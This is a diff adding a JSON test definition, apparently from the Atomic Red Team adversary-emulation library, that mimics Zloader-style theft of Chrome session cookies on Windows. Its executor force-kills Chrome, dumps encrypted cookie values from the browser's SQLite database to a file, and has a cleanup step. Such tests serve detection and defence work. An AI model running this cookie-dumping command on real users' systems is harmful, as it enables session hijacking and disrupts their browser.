@@ -1,0 +1,48 @@
+{
+    "name": "Steal Chrome Cookies (Windows)",
+    "description": "This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function.  Once an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft.  Note: If Chrome is running, the process will be killed to ensure that the DB file isn't locked.  See https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.  ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "stop-process -name \"chrome\" -force -erroraction silentlycontinue\n\"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\" | cmd /c #{sqlite3_path} \"#{cookie_db}\" | out-file -filepath \"#{output_file}\"\n",
+        "cleanup_command": "remove-item #{output_file}\n",
+        "name": "powershell",
+        "elevation_required": false,
+        "type": "Command Executor"
+    },
+    "id": "T1539",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Steal Web Session Cookie",
+    "source": "ART",
+    "uuid": "26a6b840-4943-4965-8df5-ef1f9a282440",
+    "arguments": {
+        "cookie_db": {
+            "description": "Filepath for Chrome cookies database",
+            "type": "string",
+            "default": "$env:localappdata\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
+        },
+        "sqlite3_path": {
+            "description": "Path to sqlite3",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe"
+        },
+        "output_file": {
+            "description": "Filepath to output cookies",
+            "type": "path",
+            "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "Sqlite3 must exist at (#{sqlite3_path})\n",
+            "prereq_command": "if (Test-Path \"#{sqlite3_path}\") {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\"\nExpand-Archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -force\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
